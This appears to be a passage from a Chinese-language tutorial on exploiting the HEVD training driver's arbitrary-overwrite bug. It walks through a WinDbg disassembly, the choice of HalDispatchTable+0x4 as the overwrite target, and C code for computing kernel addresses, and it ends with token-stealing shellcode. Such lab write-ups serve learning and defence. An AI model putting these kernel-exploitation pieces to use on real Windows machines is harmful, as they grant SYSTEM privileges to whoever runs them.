    840cc417 55              push    ebp
    840cc418 8bec            mov     ebp,esp
    840cc41a 83ec10          sub     esp,10h
    840cc41d 83f801          cmp     eax,1
    840cc420 7507            jne     nt!KeQueryIntervalProfile+0x14 (840cc429)
    840cc422 a1c86af683      mov     eax,dword ptr [nt!KiProfileAlignmentFixupInterval (83f66ac8)]
    840cc427 c9              leave
    2: kd> u
    nt!KeQueryIntervalProfile+0x13:
    840cc428 c3              ret
    840cc429 8945f0          mov     dword ptr [ebp-10h],eax
    840cc42c 8d45fc          lea     eax,[ebp-4]
    840cc42f 50              push    eax
    840cc430 8d45f0          lea     eax,[ebp-10h]
    840cc433 50              push    eax
    840cc434 6a0c            push    0Ch
    840cc436 6a01            push    1
    2: kd> 
    nt!KeQueryIntervalProfile+0x23:
    840cc438 ff15fcc3f283    call    dword ptr [nt!HalDispatchTable+0x4 (83f2c3fc)]
    840cc43e 85c0            test    eax,eax
    840cc440 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (840cc44d)
    840cc442 807df400        cmp     byte ptr [ebp-0Ch],0
    840cc446 7405            je      nt!KeQueryIntervalProfile+0x38 (840cc44d)
    840cc448 8b45f8          mov     eax,dword ptr [ebp-8]
    840cc44b c9              leave
    840cc44c c3              ret
上面的`0x840cc438`处会有一个指针数组，这里就是我们shellcode需要覆盖的地方，为什么是这个地方呢？这是前人发现的，这个函数在内核中调用的很少，可以安全可靠地覆盖，而不会导致计算机崩溃，对于初学者而言就把这个地方当公式用吧，下面简单看一下`HalDispatchTable`这个内核服务函数指针表，结构如下
    HAL_DISPATCH HalDispatchTable = {
        HAL_DISPATCH_VERSION,
        xHalQuerySystemInformation,
        xHalSetSystemInformation,
        xHalQueryBusSlots,
        xHalDeviceControl,
        xHalExamineMBR,
        xHalIoAssignDriveLetters,
        xHalIoReadPartitionTable,
        xHalIoSetPartitionInformation,
        xHalIoWritePartitionTable,
        xHalHandlerForBus,                  // HalReferenceHandlerByBus
        xHalReferenceHandler,               // HalReferenceBusHandler
        xHalReferenceHandler                // HalDereferenceBusHandler
        };
我们需要很清楚的知道，我们刚才在找什么，我们就是在找where指针的位置，所以我们只需要把where的位置放在`HalDispatchTable+0x4`处就行了，而what指针我们希望的是存放shellcode的位置
  * what -> &shellcode
  * where -> HalDispatchTable+0x4
## 利用代码
上面我们解释了where和what指针的原理，现在我们需要用代码来实现上面的过程，我们主要聚焦点在where指针上，我们需要找到`HalDispatchTable+0x4`的位置，我们大致分一下流程：
  1. 找到 ntkrnlpa.exe 在 kernel mode 中的基地址
  2. 找到 ntkrnlpa.exe 在 user mode 中的基地址
  3. 找到 HalDispatchTable 在 user mode 中的地址
  4. 计算 HalDispatchTable+0x4 的地址
**ntkrnlpa.exe 在 kernel mode 中的基地址**
我们用`EnumDeviceDrivers`函数检索系统中每个设备驱动程序的加载地址，然后用`GetDeviceDriverBaseNameA`函数检索指定设备驱动程序的基本名称，以此确定
ntkrnlpa.exe 在内核模式中的基地址，当然我们需要包含文件头`Psapi.h`
    LPVOID NtkrnlpaBase()
    {
        LPVOID lpImageBase[1024];
        DWORD lpcbNeeded;
        TCHAR lpfileName[1024];
        //Retrieves the load address for each device driver in the system
        EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
        for (int i = 0; i < 1024; i++)
        {
            //Retrieves the base name of the specified device driver
            GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);
            if (!strcmp(lpfileName, "ntkrnlpa.exe"))
            {
                printf("[+]success to get %s\n", lpfileName);
                return lpImageBase[i];
            }
        }
        return NULL;
    }
**ntkrnlpa.exe 在 user mode 中的基地址**
我们用函数`LoadLibrary`将指定的模块加载到调用进程的地址空间中，获取它在用户模式下的基地址
    HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");
**HalDispatchTable 在 user mode 中的地址**
我们用`GetProcAddress`函数返回`ntkrnlpa.exe`中的导出函数`HalDispatchTable`的地址
    PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
**计算 HalDispatchTable+0x4 的地址**
如果你是一个pwn选手的话，你可以把这里的计算过程类比计算函数中的偏移，实际地址 = 基地址 +
偏移，最终我们确定下了`HalDispatchTable+0x4`的地址
    DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;
我们计算出了where指针的位置，what指针放好shellcode的位置之后，我们再次调用`NtQueryIntervalProfile`内核函数就可以实现提权，但是这里的`NtQueryIntervalProfile`函数需要我们自己去定义(函数的详情建议下一个Windows
NT4的源码查看)，函数原型如下：
    NTSTATUS
    NtQueryIntervalProfile (
        IN KPROFILE_SOURCE ProfileSource,
        OUT PULONG Interval
        )
最后你可能还要注意一下堆栈的平衡问题，shellcode中需要平衡一下堆栈
    static VOID ShellCode()
    {
        _asm
        {
            //int 3
            pop edi // the stack balancing
            pop esi
            pop ebx
            pushad
            mov eax, fs: [124h]     // Find the _KTHREAD structure for the current thread
            mov eax, [eax + 0x50]   // Find the _EPROCESS structure
            mov ecx, eax
            mov edx, 4              // edx = system PID(4)
            // The loop is to get the _EPROCESS of the system
            find_sys_pid :
                         mov eax, [eax + 0xb8]  // Find the process activity list
                         sub eax, 0xb8          // List traversal
                         cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
                         jnz find_sys_pid
                         // Replace the Token
                         mov edx, [eax + 0xf8]
                         mov[ecx + 0xf8], edx
                         popad
                         //int 3
                         ret
        }
    }
详细的代码参考[这里](https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c)，最后提权成功
# 0x03：后记
上面的东西一定要自己调一遍，如何堆栈平衡的我没有写的很细，如果是初学者建议自己下断点调试，可能在整个过程中你会有许多问题，遇到问题千万不要马上就问，至少你要想半小时再去问，如果是个特别小的问题，可能别人还没来得及回你，你自己琢磨已经解决了，下一篇我会继续学习HEVD的其他漏洞，一起加油吧！